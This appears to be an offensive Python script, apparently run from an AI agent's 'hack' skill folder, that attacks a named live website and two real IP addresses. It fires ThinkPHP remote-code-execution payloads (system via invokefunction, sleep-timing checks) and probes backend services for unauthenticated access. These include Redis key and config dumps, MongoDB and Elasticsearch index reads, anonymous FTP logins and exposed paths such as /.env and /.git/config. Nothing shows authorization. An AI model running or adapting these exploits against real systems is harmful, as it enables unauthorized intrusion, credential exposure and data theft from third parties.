#!/usr/bin/env python3
"""Definitive RCE timing test + direct backend service probing."""
import sys, re, time, socket
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.stderr.reconfigure(encoding='utf-8', errors='replace')
sys.path.insert(0, r"C:\Users\97912\.codex\skills\hack\scripts")
from cdp_launch import connect_playwright_cdp

BASE = "https://jgy09.com"
PORT = 9222

browser, pw = connect_playwright_cdp(port=PORT, stealth=True)
ctx = browser.contexts[0]

print("="*60)
print("  DEFINITIVE RCE + BACKEND PROBE")
print("="*60)

# ============ 1. Timing-based RCE ============
print("\n[*] === Timing-based RCE Detection ===")
# If system('sleep 3') works, response will be delayed by 3s
timing_tests = [
    ("baseline", BASE + "/index.php?s=index/index"),
    ("sleep 3 (Request)", BASE + "/index.php?s=index/\\think\\Request/input&filter=system&data=sleep+3"),
    ("sleep 3 (App)", BASE + "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=sleep+3"),
    ("sleep 3 (captcha)", BASE + "/index.php?s=captcha&test=-1&_=1&filter=system&method=GET&get[]=sleep+3"),
    ("sleep 3 (php sleep)", BASE + "/index.php?s=index/\\think\\Request/input&filter=sleep&data=3"),
    ("usleep (Request)", BASE + "/index.php?s=index/\\think\\Request/input&filter=usleep&data=3000000"),
    # ThinkPHP 5.1.x
    ("sleep 3 (5.1)", BASE + "/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=sleep+3"),
    # ThinkPHP 5.0.x debug mode
    ("sleep 3 (5.0 debug)", BASE + "/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=sleep+3"),
]

for label, url in timing_tests:
    t_start = time.time()
    try:
        resp = ctx.request.get(url, timeout=20000)
    except:
        pass
    elapsed = time.time() - t_start
    flag = " [!!!] RCE CONFIRMED!" if elapsed > 2.5 and "sleep" in label else ""
    print(f"  {elapsed:.2f}s — {label}{flag}")

# ============ 2. Direct backend service access ============
print("\n\n[*] === Direct Backend Service Access ===")

# 43.248.139.40 — all ports open, let's try to access services
print("\n  --- 43.248.139.40 ---")

# MySQL (3306) — try to get version/handshake
print("\n  MySQL (3306):")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect(("43.248.139.40", 3306))
    banner = sock.recv(1024)
    if banner:
        # Parse MySQL greeting
        if len(banner) > 5:
            ver_end = banner.index(0, 5) if 0 in banner[5:] else len(banner)
            version = banner[5:ver_end].decode('ascii', errors='replace')
            print(f"    MySQL Version: {version}")
            # Try weak credentials
            sock.close()
            # Can't easily auth via raw socket, but version is useful
    sock.close()
except Exception as e:
    print(f"    Error: {e}")

# Redis (6379) — try unauthorized access
print("\n  Redis (6379):")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect(("43.248.139.40", 6379))
    sock.send(b"INFO\r\n")
    resp = sock.recv(65536)
    if b"redis_version" in resp:
        print(f"    [!] Redis UNAUTHORIZED ACCESS!")
        ver = re.search(rb'redis_version:([^\r\n]+)', resp)
        if ver:
            print(f"    Version: {ver.group(1).decode()}")
        # Get more info
        sock.send(b"CONFIG GET *\r\n")
        config = sock.recv(65536)
        if config:
            # Look for passwords
            pass_match = re.findall(rb'requirepass\s+(.+)', config)
            if pass_match:
                print(f"    Password set: {pass_match[0]}")
            else:
                print(f"    No password (requirepass empty)")
        # Get keys
        sock.send(b"KEYS *\r\n")
        keys = sock.recv(65536)
        if keys and keys != b"$0\r\n\r\n":
            print(f"    Keys: {keys[:500].decode('ascii', errors='replace')}")
        # Get DB size
        sock.send(b"DBSIZE\r\n")
        dbsize = sock.recv(1024)
        print(f"    DB size: {dbsize.decode('ascii', errors='replace').strip()}")
    elif b"NOAUTH" in resp:
        print(f"    Redis requires authentication")
    else:
        print(f"    Response: {resp[:100]}")
    sock.close()
except Exception as e:
    print(f"    Error: {e}")

# MongoDB (27017)
print("\n  MongoDB (27017):")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect(("43.248.139.40", 27017))
    # Send ismaster command (raw BSON)
    import struct
    # Minimal ismaster BSON query
    bson = b'\x18\x00\x00\x00'  # message length
    bson += b'\x01\x00\x00\x00'  # request ID
    bson += b'\x00\x00\x00\x00'  # response to
    bson += b'\xd4\x07\x00\x00'  # opcode (2012 = OP_MSG)
    bson += b'\x00\x00\x00\x00'  # flags
    bson += b'admin.$cmd\x00'    # collection
    bson += b'\x00\x00\x00\x00\x01\x00\x00\x00'  # skip, num return
    bson += b'\x15\x00\x00\x00'  # BSON doc size
    bson += b'\x10ismaster\x00'  # int32 field
    bson += b'\x01\x00\x00\x00'  # value = 1
    bson += b'\x00'              # end of doc
    sock.send(bson)
    resp = sock.recv(65536)
    if resp:
        print(f"    [!] MongoDB RESPONDS ({len(resp)} bytes) — unauthorized access!")
        # Extract version
        ver_match = re.search(rb'version["\x00:]+([0-9.]+)', resp)
        if ver_match:
            print(f"    Version: {ver_match.group(1).decode()}")
    sock.close()
except Exception as e:
    print(f"    Error: {e}")

# Elasticsearch (9200)
print("\n  Elasticsearch (9200):")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect(("43.248.139.40", 9200))
    sock.send(b"GET / HTTP/1.0\r\nHost: 43.248.139.40\r\n\r\n")
    resp = sock.recv(65536)
    if resp:
        resp_str = resp.decode('utf-8', errors='replace')
        if "cluster_name" in resp_str or "elastic" in resp_str.lower():
            print(f"    [!] Elasticsearch UNAUTHORIZED ACCESS!")
            ver = re.search(r'"version"\s*:\s*\{[^}]*"number"\s*:\s*"([^"]+)"', resp_str)
            if ver:
                print(f"    Version: {ver.group(1)}")
            # Get all indices
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect(("43.248.139.40", 9200))
            sock.send(b"GET /_cat/indices HTTP/1.0\r\nHost: 43.248.139.40\r\n\r\n")
            indices = sock.recv(65536)
            if indices:
                print(f"    Indices: {indices.decode('utf-8', errors='replace')[:500]}")
        else:
            print(f"    Response: {resp_str[:200]}")
    sock.close()
except Exception as e:
    print(f"    Error: {e}")

# SSH (22) — get banner
print("\n  SSH (22):")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect(("43.248.139.40", 22))
    banner = sock.recv(1024)
    print(f"    Banner: {banner.decode('ascii', errors='replace').strip()}")
    sock.close()
except Exception as e:
    print(f"    Error: {e}")

# FTP (21)
print("\n  FTP (21):")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect(("43.248.139.40", 21))
    banner = sock.recv(1024)
    print(f"    Banner: {banner.decode('ascii', errors='replace').strip()}")
    # Try anonymous login
    sock.send(b"USER anonymous\r\n")
    resp = sock.recv(1024)
    print(f"    USER anonymous: {resp.decode('ascii', errors='replace').strip()}")
    if b"331" in resp:
        sock.send(b"PASS test@test.com\r\n")
        resp = sock.recv(1024)
        print(f"    PASS: {resp.decode('ascii', errors='replace').strip()}")
        if b"230" in resp:
            print(f"    [!] ANONYMOUS FTP LOGIN SUCCESS!")
    sock.close()
except Exception as e:
    print(f"    Error: {e}")

# RDP (3389)
print("\n  RDP (3389):")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect(("43.248.139.40", 3389))
    banner = sock.recv(1024)
    if banner:
        print(f"    [!] RDP banner received ({len(banner)} bytes)")
        # Check for NLA
        if banner[0] == 0x03:
            print(f"    RDP with NLA (CredSSP)")
        else:
            print(f"    RDP without NLA — potential brute force target!")
    sock.close()
except Exception as e:
    print(f"    Error: {e}")

# HTTP (80) — get more info
print("\n  HTTP (80):")
try:
    resp = ctx.request.get("http://43.248.139.40/", timeout=8000)
    if resp:
        print(f"    Status: {resp.status}, Server: {resp.headers.get('server','?')}")
        print(f"    Body: {resp.text()[:200]}")
        # Try common admin paths
    for path in ["/admin/", "/phpmyadmin/", "/adminer/", "/manager/",
                 "/.env", "/.git/config", "/server-status",
                 "/wp-config.php", "/config.php", "/info.php",
                 "/api/", "/swagger/", "/actuator/health",
                 "/console", "/debug/"]:
        try:
            resp2 = ctx.request.get(f"http://43.248.139.40{path}", timeout=5000)
            if resp2 and resp2.status in [200, 301, 302, 401, 403]:
                print(f"    [{resp2.status}] {path} ({len(resp2.text())}b)")
                if resp2.status == 200 and len(resp2.text()) < 2000:
                    print(f"      Body: {resp2.text()[:150]}")
        except:
            pass
except Exception as e:
    print(f"    Error: {e}")

# ============ 3. Check 103.39.222.193 services ============
print("\n\n  --- 103.39.222.193 ---")

# Redis
print("\n  Redis (6379):")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect(("103.39.222.193", 6379))
    sock.send(b"INFO\r\n")
    resp = sock.recv(65536)
    if b"redis_version" in resp:
        print(f"    [!] Redis UNAUTHORIZED ACCESS!")
        ver = re.search(rb'redis_version:([^\r\n]+)', resp)
        if ver:
            print(f"    Version: {ver.group(1).decode()}")
        sock.send(b"KEYS *\r\n")
        keys = sock.recv(65536)
        print(f"    Keys: {keys[:300].decode('ascii', errors='replace')}")
    elif b"NOAUTH" in resp:
        print(f"    Redis requires auth")
    sock.close()
except Exception as e:
    print(f"    Error: {e}")

# MySQL
print("\n  MySQL (3306):")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect(("103.39.222.193", 3306))
    banner = sock.recv(1024)
    if banner:
        ver_end = banner.index(0, 5) if 0 in banner[5:] else len(banner)
        version = banner[5:ver_end].decode('ascii', errors='replace')
        print(f"    MySQL Version: {version}")
    sock.close()
except Exception as e:
    print(f"    Error: {e}")

# SSH
print("\n  SSH (22):")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect(("103.39.222.193", 22))
    banner = sock.recv(1024)
    print(f"    Banner: {banner.decode('ascii', errors='replace').strip()}")
    sock.close()
except Exception as e:
    print(f"    Error: {e}")

# FTP
print("\n  FTP (21):")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect(("103.39.222.193", 21))
    banner = sock.recv(1024)
    print(f"    Banner: {banner.decode('ascii', errors='replace').strip()}")
    sock.send(b"USER anonymous\r\n")
    resp = sock.recv(1024)
    if b"331" in resp:
        sock.send(b"PASS test@test.com\r\n")
        resp2 = sock.recv(1024)
        if b"230" in resp2:
            print(f"    [!] ANONYMOUS FTP SUCCESS!")
    sock.close()
except Exception as e:
    print(f"    Error: {e}")

# Port 8001
print("\n  Port 8001:")
try:
    resp = ctx.request.get("http://103.39.222.193:8001/", timeout=8000)
    if resp:
        print(f"    HTTP {resp.status}, Server: {resp.headers.get('server','?')}")
        print(f"    Body: {resp.text()[:200]}")
except Exception as e:
    print(f"    Error: {e}")

print("\n[*] All probing complete.")
